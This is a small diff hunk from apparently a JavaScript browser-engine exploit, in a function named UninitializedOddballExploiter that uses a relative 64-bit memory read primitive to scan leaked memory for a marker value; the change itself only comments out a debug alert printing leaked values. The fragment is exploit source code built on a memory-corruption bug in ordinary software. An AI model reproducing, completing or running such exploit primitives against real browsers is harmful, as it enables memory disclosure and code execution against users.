@@ -238,7 +238,7 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
             let value = relative_read64(i);
             helpers.set_i64(value);
             var [hi, lo] = helpers.get_u32_pair();
-            alert(hex(hi)+hex(lo));
+            // alert(hex(hi)+hex(lo));
             // alert(hex(lo));
             if (hi == 2734n || lo == 2734n) {
                 let prev2 = relative_read64(i - 2);
